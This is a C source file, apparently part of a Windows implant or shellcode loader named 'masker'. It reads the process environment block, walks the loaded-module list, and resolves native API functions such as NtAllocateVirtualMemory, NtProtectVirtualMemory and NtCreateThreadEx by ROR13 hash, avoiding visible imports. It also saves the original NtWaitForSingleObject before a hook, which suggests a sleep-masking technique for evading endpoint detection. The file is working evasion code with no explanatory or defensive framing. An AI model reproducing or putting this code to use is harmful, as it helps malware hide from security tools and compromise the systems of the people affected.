#include "masker.h"
#include <stdint.h>

/* ── ROR13 hash ── */
static inline uint32_t ror13(uint32_t v) { return (v >> 13) | (v << 19); }
static uint32_t hash_str(const char *s) {
    uint32_t h = 0;
    while (*s) { h = ror13(h) + (uint8_t)(*s++); }
    return h;
}

/* ── PEB types ── */
typedef struct { USHORT Len, Max; PWSTR Buf; } UNI_STR;
typedef struct {
    LIST_ENTRY InLoadOrder, InMemOrder, InInitOrder;
    PVOID DllBase, Entry;
    ULONG SzImg;
    UNI_STR FullName, BaseName;
} LDR_ENTRY;
typedef struct {
    ULONG Len; BOOLEAN Init;
    PVOID Ssh;
    LIST_ENTRY InLoadOrder;
} PEB_LDR;
typedef struct {
    BYTE r1[2]; BYTE Debug; BYTE r2[1]; PVOID r3[2]; PEB_LDR *Ldr;
} MY_PEB;

static MY_PEB *get_peb(void) {
    MY_PEB *p;
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(p));
    return p;
}

void *patch_resolve(uint32_t hash) {
    MY_PEB *peb = get_peb();
    LIST_ENTRY *head = &peb->Ldr->InLoadOrder;
    for (LIST_ENTRY *c = head->Flink; c != head; c = c->Flink) {
        LDR_ENTRY *m = CONTAINING_RECORD(c, LDR_ENTRY, InLoadOrder);
        if (!m->DllBase) continue;
        uint8_t *base = (uint8_t *)m->DllBase;
        IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
        IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) continue;
        DWORD rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (!rva) continue;
        IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + rva);
        DWORD *names = (DWORD *)(base + exp->AddressOfNames);
        WORD  *ords  = (WORD  *)(base + exp->AddressOfNameOrdinals);
        DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);
        for (DWORD i = 0; i < exp->NumberOfNames; i++) {
            if (hash_str((const char *)(base + names[i])) == hash)
                return (void *)(base + funcs[ords[i]]);
        }
    }
    return NULL;
}

/* ── Hash constants (from gen-hashes) ── */
#define H_NtAllocateVirtualMemory  0xD33BCABD
#define H_NtProtectVirtualMemory   0x8C394D89
#define H_NtCreateThreadEx         0x4D1DEB74
#define H_NtWaitForSingleObject    0xAE06C1B2
#define H_NtFreeVirtualMemory      0xDB63B5AB
#define H_NtDelayExecution         0xD4F11852
#define H_RtlCaptureContext        0x818A64C8
#define H_NtContinue               0x4B6DD47D

NtAllocateVirtualMemory_t  _NtAllocateVirtualMemory  = NULL;
NtProtectVirtualMemory_t   _NtProtectVirtualMemory   = NULL;
NtCreateThreadEx_t         _NtCreateThreadEx         = NULL;
NtWaitForSingleObject_t    _NtWaitForSingleObject    = NULL;
NtWaitForSingleObject_t    _real_NtWaitForSingleObject = NULL;
NtFreeVirtualMemory_t      _NtFreeVirtualMemory      = NULL;
NtDelayExecution_t         _NtDelayExecution         = NULL;

void resolve_all(void) {
    _NtAllocateVirtualMemory  = (NtAllocateVirtualMemory_t) patch_resolve(H_NtAllocateVirtualMemory);
    _NtProtectVirtualMemory   = (NtProtectVirtualMemory_t)  patch_resolve(H_NtProtectVirtualMemory);
    _NtCreateThreadEx         = (NtCreateThreadEx_t)        patch_resolve(H_NtCreateThreadEx);
    _NtWaitForSingleObject    = (NtWaitForSingleObject_t)   patch_resolve(H_NtWaitForSingleObject);
    _real_NtWaitForSingleObject = _NtWaitForSingleObject;   /* save before hook */
    _NtFreeVirtualMemory      = (NtFreeVirtualMemory_t)     patch_resolve(H_NtFreeVirtualMemory);
    _NtDelayExecution         = (NtDelayExecution_t)        patch_resolve(H_NtDelayExecution);
}
